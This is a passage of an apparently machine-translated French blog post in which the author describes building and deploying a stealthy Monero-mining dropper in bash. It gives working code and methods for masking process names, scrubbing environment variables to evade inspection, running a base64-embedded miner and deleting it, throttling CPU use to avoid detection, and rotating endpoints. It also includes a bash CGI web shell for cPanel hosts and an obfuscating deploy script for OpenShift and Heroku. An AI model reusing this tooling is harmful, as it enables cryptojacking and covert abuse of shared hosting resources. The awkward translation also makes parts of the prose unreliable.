        n=<span class=hljs-variable>${n/=*}</span>
        <span class=hljs-keyword>case</span> <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> <span class=hljs-keyword>in</span>
            <span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span> <span class=hljs-variable>${n/=*}</span>"</span>
        <span class=hljs-keyword>esac</span>
    <span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span>
    <span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Nettoyez vos ordures... les programmes bash complexes finissent par utiliser de nombreuses variables, et si vous abusez de l'espace global, cela devient gonflé. Si vous générez des jobs shell, ils héritent de tout l'environnement (qui est effectivement dupliqué, pas partagé), vous pouvez rapidement vous retrouver avec le bash manger<code>100M</code> de mémoire, pas sympa. Aussi, nous voulons vraiment faire profil bas. Dans notre scénario de déploiement, l'adversaire<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> peut potentiellement avoir un accès root et des informations complètes sur nos processus<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , et vous savez... chaque processus contient des informations sur la commande complète qui l'a démarré et les variables d'environnement exportées.<h2 id=configuration><a class=header-anchor href=#configuration> Configuration</a></h2><p>Une fois que nous avons notre environnement et nos outils, nous devons adapter notre mineur à la machine sur laquelle il s'exécute, étapes de configuration en pseudo-code :<ul><li><p>nom du processus pour le mineur<li><p>informations sur l'hôte (ram/cores/caches/<code>ENV_VARS</code>)<li><p>version de configuration<li><p><code>worker_id</code> pour le mineur (depuis ip et host)<li><p>ip/port pour la connexion</ul><p>Le choix d'un nom pour le processus est nécessaire pour<em> cacher</em> le fait que nous exécutons un mineur, mais nous ne renommons pas seulement notre binaire, nous avons une liste de<strong> masques</strong> pour les candidats potentiels (un fichier texte brut où chaque ligne est un masque) :<ul><li><p>choisir un masque au hasard<li><p>mélangez les éléments de la queue de la chaîne (tous sauf le premier) pour obtenir une commande de processus diversifiée. Maintenant, nous avons une chaîne qui ressemble à<code>cmd --arg2 --arg1 --arg3</code> . Ceci est notre masque de mineur, nous exécutons le binaire<em> sans pour autant</em> arguments, mais il semble que nous ayons lancé une commande<code>cmd</code> avec des arguments<code>--arg1 --arg2 --arg3</code> . Les espaces et les tirets sont autorisés dans les noms de fichiers, il est donc bon d'exécuter un binaire nommé comme ceci, il ne semble pas que Linux fasse le discernement entre l'exécutable et les arguments lors du stockage des commandes de processus.<p>La configuration du mineur est automatiquement chargée à partir de<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Taux de hachage</a></h3><p>, avec le temps, le mineur en amont a obtenu de nombreux<strong> réglage automatique</strong> fonctionnalités, donc cela a rendu une partie de mes scripts redondants, mais la différence entre l'amont et l'aval ici est que l'objectif en amont est de maximiser<em> performance</em> , alors que notre objectif est de maximiser<em> efficacité et obscurcissement</em> , nous ne voulons pas dépasser le système, nous voulons un petit peu de sangsue sans interruption de service.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Pour cela, nous avons besoin d'une compréhension plus fine de l'environnement, de la<code>l2/l3</code> structure de cache du processeur, de la mémoire vive et des cœurs, et du processeur actuel<em> moyenne</em> charge et processeur<em> usage</em>. J'ai essayé de construire un<a href=https://en.wikipedia.org/wiki/Finite-state_machine> machine d'état</a> en bash qui commencerait par le strict minimum et essaierait différentes configurations en s'installant lentement sur la meilleure moyenne. C'était un<strong> énorme</strong> gaspillage d'efforts jonché de<a href=https://en.wikipedia.org/wiki/Technical_debt> dette technique</a> qui a fait faillite très rapidement et a été pour la plupart rejetée, avec juste des restes persistants dans la base de code.<p>Fracassez tout ce jumbo de réglage automatique, nous venons de faire dormir le mineur en fonction de l'utilisation / de la charge de l'hôte, cela nécessitait des modifications du mineur à<code>sleep</code> entre les rendements des threads et quelques correctifs pour le chien de garde de la configuration<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , ce qui nous permettrait de recharger la quantité de sommeil au moment de l'exécution. La logique est beaucoup plus simplifiée et ressemble à ceci :<ul><li><p>si l'utilisation est supérieure/inférieure à $TARGET_USAGE (± marge d'erreur) augmenter/diminuer le sommeil<li><p>si charge moyenne dans<code>1m</code> est au-dessus/au-dessous de $TARGET_LOAD pause/reprise du minage</ul><h3 id=connection><a class=header-anchor href=#connection> Lien</a></h3><p>Dans notre résumé bash, nous avons montré des utilitaires pour la connexion. Pourquoi en avons-nous besoin ? Parce que nous avons besoin de diversité ; le simple codage en dur d'un point de terminaison dans la configuration ne durera pas longtemps, lorsque quelque chose semble suspect et a une activité réseau, les adresses IP sont signalées.<p>Au début, nous avons expérimenté plusieurs méthodes :<ul><li><p>à l'aide de<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> chaînes de proxy</a> pour surcharger les appels réseau du mineur, mais cela nécessitait que le mineur soit construit avec des bibliothèques dynamiques, et vous deviez les expédier avec la charge utile, donc c'était peu pratique.<li><p>exécuter un<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> tunnel avant</a> côte à côte avec le mineur : cela avait beaucoup de surcharge de configuration, car nous configurions maintenant deux processus sur chaque déploiement, ce qui représentait plus de bogues.</ul><p>À la fin, nous nous sommes contentés d'envoyer une liste de points de terminaison, stockés dans des variables bash, en en choisissant un au hasard. Les connexions étaient bien sûr cryptées. Quels sont ces points de terminaison ? Transitaires vers le proxy qui gérerait les travaux des mineurs.</p><img src=/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png><p>Pourquoi avons-nous besoin d'un<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> proxy minier</a> ? Je n'ai jamais vraiment dépassé ~ 100 connexions simultanées, donc un proxy n'était pas vraiment nécessaire pour la charge du réseau, mais c'était pratique pour négocier l'algorithme de hachage et pour fournir différentes cibles de difficulté à différents mineurs, pour empêcher les mineurs de travailler sur<strong> difficulté</strong> objectifs qui leur prendraient trop de temps à réaliser et éviteraient le risque de gaspiller des calculs sur des travaux inachevés.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> Le logiciel du pool a également nécessité quelques modifications car il annonçait volontiers qu'il était un proxy sur des requêtes http simples...<em> qui a dû être expiré</em> , et un fork a ajouté un contrôle d'accès, nous avons donc basé nos mods sur cela.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> Modification de json</a></h3><p>En appliquant des modifications à un fichier json avec juste bash, nous nous sommes débrouillés avec une substitution env var et quelques regex. Au départ, nous comptions sur un<code>envsubst</code> binaire pour appliquer des variables, puis nous sommes allés à fond<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> avec cette logique :<ul><li><p>lire le modèle de configuration<li><p>remplacer toutes les guillemets par une chaîne très ésotérique (comme<code>_#_#</code>)<li><p><code>eval</code> le gabarit<li><p>remplacer toutes les occurrences ésotériques par des guillemets</ul><p>En plus d'éviter les sous-processus, un autre avantage est que nous obtenons des capacités complètes de bash dans nos modèles. Pour lire et écrire sans modèles, nous devons nous appuyer sur les capacités de regex de bash :<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span>
<span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span> <span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span>
		<span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span>
			<span class=hljs-built_in>break</span>
		<span class=hljs-keyword>fi</span>
	<span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span>
<span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span> <span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span>
		<span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span> <span class=hljs-string>'%s'</span> <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span> <span class=hljs-string>'%s'</span> <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span>
			<span class=hljs-built_in>break</span>
		<span class=hljs-keyword>fi</span>
	<span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Cela ne nous permet d'éditer que des lignes simples, pour les entrées multilignes, il ne considère que la première ligne... mais c'est assez bon pour notre cas d'utilisation.<h2 id=runtime><a class=header-anchor href=#runtime> Durée</a></h2><p>A quoi ressemble notre runtime ? Nous avons un processus bash principal qui exécute la boucle principale, puis le sous-processus mineur, le sous-processus moniteur cpu, le casier et le tuner. C'est presque une poignée.<p>Tout d'abord, nous voulons nous assurer que si quelque chose ne va pas, nous ne laissons pas de désordre, cela signifie que nous utilisons un piège bash pour effectuer des nettoyages à la fin<pre><code class="bash hljs"><span class=hljs-built_in>trap</span> <span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> désactive le piège pour empêcher la récursivité. Le piège tue tous les emplois et supprime l'environnement de travail.<p>Il est temps de démarrer le mineur, qui est stocké en tant que variable bash dans l'encodage base64. Nous le vidons sur le système de fichiers, puis nous vidons la configuration, exécutons le mineur et supprimons à la fois le mineur et la configuration. Sous Linux, vous pouvez supprimer l'exécutable d'un processus en cours (sur Windows, cela n'est pas autorisé).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> Lorsque le mineur est en cours d'exécution, sur le système de fichiers, il n'y a qu'un<code>.. /</code> répertoire avec un<code>b64</code> lien dedans.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span>
<span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span>
    <span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span>
        <span class=hljs-built_in>log</span> <span class=hljs-string>"gobbling in array"</span>
        <span class=hljs-built_in>eval</span> <span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span> <span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span>
        <span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span>
    <span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span>
<span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span>
        <span class=hljs-keyword>if</span> <span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span> <span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span>
            <span class=hljs-built_in>return</span>
        <span class=hljs-keyword>else</span>
            <span class=hljs-comment># log "dumping from array"</span>
            <span class=hljs-built_in>eval</span> <span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span>
        <span class=hljs-keyword>fi</span>
        <span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span> <span class=hljs-keyword>if</span> <span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span> <span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span>
             <span class=hljs-built_in>return</span>
         <span class=hljs-keyword>else</span>
             <span class=hljs-comment># log "dumping from array"</span>
             <span class=hljs-built_in>eval</span> <span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span>
         <span class=hljs-keyword>fi</span>
         <span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Une bizarrerie exaspérante rencontrée avec bash lors de l'encodage du mineur est celle d'attribuer une variable avec un sous-shell avec des guillemets<code>myvar="$(something)"</code> provoque une augmentation permanente de l'utilisation de la mémoire, c'était difficile à déboguer et je n'ai pas vraiment trouvé la raison pour laquelle se comporte comme ça, de toute façon l'affectation doit être sans guillemets. Le décodage se fait plutôt avec<em> chaînes ici</em> qui est une abstraction sur les fichiers temporaires, la variable est sauvegardée dans un fichier qui est ensuite redirigé vers le processus.<p>La boucle de longue durée du mineur :<ul><li><p>bien que vrai<ul><li><p>arrêter le mineur<li><p>supprimer la configuration<li><p>démarrer le mineur<li><p>bien que vrai<ul><li><p>démarrer le démon<ul><li><p>pendant que le mineur est en cours d'exécution<ul><li><p>lire la sortie du mineur<li><p>choisissez l'action du mineur en fonction de la ligne de sortie</ul></ul><li><p>si le mineur ne fonctionne pas : pause</ul><li><p>dormir</ul></ul><p>La ligne de sortie est comparée à une certaine regex :<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>Le démon gère les cas où<ul><li><p>la connexion au point de terminaison donne des erreurs (choisissez un nouveau point de terminaison aléatoire)<li><p>l'algorithme de hachage change (ajuster le temps de sommeil et les configurations ad-hoc)<li><p>problèmes de mineur (redémarrer le mineur).</ul><p>Pendant un certain temps, le tableau de bord de commande et de contrôle a été pris en charge, ce qui a permis de déclencher des redémarrages manuels, mais comme son utilisation était minime, il a été supprimé et ses points de terminaison ont été remplacés par une connexion de pool alternative. Le processus de redémarrage était également instable, complexe. ..un autre exemple de dette technologique. Cependant, cela a permis de récupérer une charge utile mise à jour et de réinitialiser toutes les configurations à la volée, ce qui était plutôt cool, le trampoline ultime.<h2 id=debugging><a class=header-anchor href=#debugging> Débogage</a></h2><p>Il existe trois principaux utilitaires<ul><li><p>activer/désactiver le traçage autour des blocs de code (nous ne voulons pas tracer un binaire encodé en b64 dans une variable..)<li><p>une fonction simple pour formater les journaux<li><p>un indicateur qui activerait la journalisation détaillée au moment de l'exécution à chaque démarrage du mineur.<ul><li><p>fait le fichier<code>.debug</code> exister?<ul><li><p>activer la journalisation détaillée</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Déploiements cibles</a></h2><p>Cette configuration a été testée sur 3 types d'hôtes :<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Conteneurs ou VM auto-hébergés</a></h3><p>De nombreux fournisseurs d'hébergement n'aiment pas le minage car les ressources CPU ont tendance à être partagées entre plusieurs utilisateurs, et le logiciel de minage peut facilement ralentir un nœud hôte, ce qui a un impact sur les performances du reste des utilisateurs. Cela peut être vrai même si le temps d'utilisation du processeur est illimité, car les algorithmes de hachage peuvent saturer toutes les couches de mise en cache du processeur si le cache est partagé entre tous les cœurs du processeur.<p>Nous aimerions utiliser notre<em> équitable</em> partager des ressources sans être banni, c'est un bon cas d'utilisation pour notre compte-gouttes furtif car il est conscient de l'utilisation de l'hôte, ce qui signifie qu'il<em> devrait</em> rester un peu dans [AUP]. Il n'y a pas d'étapes supplémentaires lors du traitement des déploiements auto-hébergés, juste le script du lanceur, peut-être ajouté à la séquence de démarrage ou lancé manuellement.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> Hébergement Web basé sur cPanel</a></h3><p>Les plans d'abonnement d'hébergement Web sont principalement proposés via [cPanel]. Ici encore, nous utilisons des plans d'abonnement personnels qui ont des limites de ressources raisonnables, d'autre part, tout plan gratuit a des limites ridicules<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel vous permet de définir des gestionnaires pour différentes extensions de fichiers, cela nous permet d'exécuter des scripts shell via le<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> avec une requête http contre un script shell téléchargé sur le serveur. Ces types d'interfaces sont à quoi ressemblent les web-shells<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Un simple shell Web bash<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span>
<span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span>
<span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span>
    <span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span>
<span class=hljs-keyword>done</span>
<span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span>
<span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

<span class=hljs-keyword>if</span> <span class=hljs-built_in>declare</span> -f <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span> 1>/dev/null; <span class=hljs-keyword>then</span> <span class=hljs-comment>## don't use -n, redirect fd for bcompat</span>
    <span class=hljs-built_in>printf</span> <span class=hljs-string>'%b'</span> <span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
<span class=hljs-keyword>else</span>
    <span class=hljs-keyword>if</span> <span class=hljs-built_in>builtin</span> <span class=hljs-string>"<span class=hljs-variable>${url_encoded/\%20*}</span>"</span>; <span class=hljs-keyword>then</span>
        <span class=hljs-built_in>printf</span> <span class=hljs-string>'%b'</span> <span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>else</span>
        <span class=hljs-built_in>printf</span> <span class=hljs-string>'exec %b'</span> <span class=hljs-string>"<span class=hljs-variable>${url_encoded//%/\\x}</span>"</span> > /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src
    <span class=hljs-keyword>fi</span>
<span class=hljs-keyword>fi</span>
. /tmp/<span class=hljs-variable>${SERVER_NAME}</span>.src</code></pre><p>Il est préférable de ne s'appuyer que sur les fonctions intégrées, car le fork de processus supplémentaires peut ne pas être autorisé dans les prisons Web, mais il est toujours possible de<code>exec</code> ce qui nous permet d'utiliser la plupart des utilitaires de ligne de commande. La plupart des shells Web sont écrits dans d'autres langages de script tels que python ou php, car vous n'avez pas à vous soucier du fork.<p>Dans un environnement cpanel, il est préférable d'utiliser un nom statique pour le processus de mineur, comme<code>httpd</code> ou<code>php-fpm</code> car<code>cgi</code> est basé sur le multi-traitement, de sorte que les serveurs sont toujours remplis de nombreux processus nommés comme ceci, bien qu'un observateur attentif devrait remarquer le<em> multi-thread</em> modèle d'utilisation qui n'est certainement pas courant (ou possible) pour des langages tels que perl, php, ruby ​​ou python !<p>Les processus ont aussi une limite de temps par défaut, (1 heure, 1 jour, etc.), pour cela nous utilisons juste une tâche cron qui redémarre le compte-gouttes.<p>Cela a nécessité beaucoup d'édition manuelle, l'API cpanel pour automatiser cela n'est malheureusement pas exposée aux utilisateurs finaux, donc l'hébergement Web est une cible maladroite et ennuyeuse pour notre compte-gouttes de mineur.<h3 id=web_environments><a class=header-anchor href=#web_environments> Environnements Web</a></h3><p>Il y a<em> SaaS</em> fournisseurs qui ont un éditeur web couplé à un conteneur, tels que<a href="with a free tier before getting acquired by amazon"> Cloud 9</a> , [codeanywhere], [codenvy]. Le déploiement du compte-gouttes ici est facile (vous disposez d'un environnement à part entière), mais le faire fonctionner est un fardeau, car tout éditeur Web interactif met fin à sa session peu de temps après la fermeture de la page Web et le conteneur est par conséquent mis en veille (sauf si vous payer bien sûr).<p>Contourner cela ne peut que signifier que nous devons garder les sessions ouvertes, certains scripts avec [puppeteer] ont atteint le résultat souhaité, mais avoir des pages Web SPA de longue durée, de fuite de mémoire et gonflées est définitivement peu attrayant et non furtif, car du backend du fournisseur, une session ouverte 24h/24 et 7j/7 aura certainement l'air suspecte. En effet, les environnements Web sont également des cibles maladroites et ennuyeuses.<h3 id=free_apps_services><a class=header-anchor href=#free_apps_services> Services d'applications gratuites</a></h3><p>C'est principalement<a href="when it used to have a free tier"> openshift</a><sup id=fnref:openshift><a class=fnref href=#fndef:openshift>[11]</a></sup> et [heroku]. Openshift, étant kubernetes était assez simple à déployer, mais plein de désabonnement de configuration, voici un extrait :<pre><code class="sh hljs"><span class=hljs-built_in>export</span> PATH=.:<span class=hljs-variable>$PATH</span>

[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_PRJ</span>"</span> ] && { <span class=hljs-built_in>echo</span> <span class=hljs-string>"no account data provided"</span>; <span class=hljs-built_in>exit</span> 1; }
obfs=~/utils/deploy/obfs.sh
[ -x <span class=hljs-variable>$obfs</span> ] ||
    { <span class=hljs-built_in>echo</span> <span class=hljs-string>"obfs utility not found!"</span>; <span class=hljs-built_in>exit</span> 1; }
launcher=~/launcher
[ -f <span class=hljs-variable>$launcher</span> ] ||
    { <span class=hljs-built_in>echo</span> <span class=hljs-string>"launcher script not found!"</span>; <span class=hljs-built_in>exit</span> 1; }

ctroot=<span class=hljs-variable>${CT_ROOT_DIR:-oc-ct-box-mine}</span>
<span class=hljs-comment>## the service that starts the miner is named app in /etc/services.d in the rootfs</span>
scriptpath=<span class=hljs-string>"rootfs/etc/services.d/app/run"</span>
TYPE=<span class=hljs-variable>${HRK_TYPE:-worker}</span>
IMG=$(oc-endpoint)/<span class=hljs-variable>$OC_PRJ</span>/<span class=hljs-variable>$OC_APP</span>
tspath=/tmp/oc-tmp-apprun
prepend=<span class=hljs-string>"#!/usr/bin/with-contenv bash
"</span>
<span class=hljs-comment>## beware the newline ^^^</span>

<span class=hljs-built_in>cd</span> <span class=hljs-variable>$ctroot</span> || { <span class=hljs-built_in>echo</span> <span class=hljs-string>"couldn't find ct build directory"</span>; <span class=hljs-built_in>exit</span> 1; }

VARS=$(<span class=hljs-built_in>cat</span> vars) || { <span class=hljs-built_in>echo</span> <span class=hljs-string>'vars file empty!'</span>; }
VARS=<span class=hljs-variable>${VARS//$'\n'/ }</span>
VARS=<span class=hljs-variable>${VARS//\\/\\\\}</span> <span class=hljs-comment>## preserve escapes</span>
script=$(<span class=hljs-built_in>cat</span> <span class=hljs-variable>$launcher</span> | <span class=hljs-built_in>tail</span> +2 | sed -r <span class=hljs-string>'/^echo "export \\$/a '</span><span class=hljs-string>"<span class=hljs-variable>$VARS</span>"</span><span class=hljs-string>' \\'</span>)
<span class=hljs-built_in>cat</span> <<< <span class=hljs-string>"<span class=hljs-variable>$script</span>"</span> > <span class=hljs-variable>$tspath</span>
<span class=hljs-variable>$obfs</span> <span class=hljs-variable>$tspath</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span> ] && { <span class=hljs-built_in>echo</span> <span class=hljs-string>"obfs file not found?"</span>; <span class=hljs-built_in>exit</span> 1; }
<span class=hljs-built_in>cat</span> <<< <span class=hljs-string>"$prepend<span class=hljs-subst>$(cat <span class=hljs-string>"<span class=hljs-variable>${tspath}</span>.obfs"</span>)</span>"</span> > <span class=hljs-variable>$scriptpath</span>
<span class=hljs-built_in>exec</span> itself (should <span class=hljs-built_in>eval</span>)
<span class=hljs-built_in>chmod</span> +x <span class=hljs-variable>$scriptpath</span>

docker build -t <span class=hljs-variable>$IMG</span>  . || <span class=hljs-built_in>exit</span> 1
<span class=hljs-built_in>cd</span> -
oc-push-image <span class=hljs-string>"<span class=hljs-variable>$IMG</span>"</span></code></pre><p>C'était le script utilisé pour créer le conteneur de minage qui nécessitait un modèle yaml :<pre><code class="yaml hljs"><span class=hljs-attr>apiVersion:</span> <span class=hljs-string>build.openshift.io/v1</span>
<span class=hljs-attr>kind:</span> <span class=hljs-string>BuildConfig</span>
<span class=hljs-attr>metadata:</span>
  <span class=hljs-attr>labels:</span>
    <span class=hljs-attr>build:</span> <span class=hljs-string>${OC_APP}</span>
  <span class=hljs-attr>name:</span> <span class=hljs-string>${OC_APP}</span>
<span class=hljs-attr>spec:</span>
  <span class=hljs-attr>activeDeadlineSeconds:</span> <span class=hljs-number>5184000</span>
  <span class=hljs-attr>failedBuildsHistoryLimit:</span> <span class=hljs-number>0</span>
  <span class=hljs-attr>successfulBuildsHistoryLimit:</span> <span class=hljs-number>0</span>
  <span class=hljs-attr>resources:</span>
    <span class=hljs-attr>limits:</span>
      <span class=hljs-attr>cpu:</span> <span class=hljs-number>2</span>
      <span class=hljs-attr>memory:</span> <span class=hljs-string>1Gi</span>
  <span class=hljs-attr>runPolicy:</span> <span class=hljs-string>Serial</span>
  <span class=hljs-attr>source:</span>
    <span class=hljs-attr>type:</span> <span class=hljs-string>Binary</span>
  <span class=hljs-attr>strategy:</span>
    <span class=hljs-attr>sourceStrategy:</span>
      <span class=hljs-attr>from:</span>
        <span class=hljs-attr>kind:</span> <span class=hljs-string>ImageStreamTag</span>
        <span class=hljs-attr>name:</span> <span class=hljs-string>${OC_APP}-build:latest</span>
        <span class=hljs-attr>namespace:</span> <span class=hljs-string>${OC_PRJ}</span>
    <span class=hljs-attr>type:</span> <span class=hljs-string>Source</span>
  <span class=hljs-attr>template:</span>
    <span class=hljs-attr>activeDeadlineSeconds:</span> <span class=hljs-number>2400</span>
  <span class=hljs-attr>triggers:</span>
    <span class=hljs-bullet>-</span> <span class=hljs-attr>generic:</span>
        <span class=hljs-attr>secretReference:</span>
          <span class=hljs-attr>name:</span> <span class=hljs-string>${OC_APP}</span>
      <span class=hljs-attr>type:</span> <span class=hljs-string>Generic</span></code></pre><p>Mais l'ensemble du processus impliquait pas mal d'étapes !<pre><code class="sh hljs"><span class=hljs-comment>## init</span>
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && <span class=hljs-built_in>export</span> $(<$(tfi))
[ -z <span class=hljs-string>"<span class=hljs-variable>$OC_APP</span>"</span> ] && { . ./choose-creds || <span class=hljs-built_in>exit</span> 1; }
oc-login
oc new-project <span class=hljs-variable>$OC_PRJ</span> || { [ -z <span class=hljs-string>"<span class=hljs-subst>$(oc get projects)</span>"</span> ] && <span class=hljs-built_in>exit</span> 1; }
oc new-app <span class=hljs-variable>$OC_APP</span> --allow-missing-images || <span class=hljs-built_in>exit</span> 1

<span class=hljs-comment>## build box with docker and push</span>
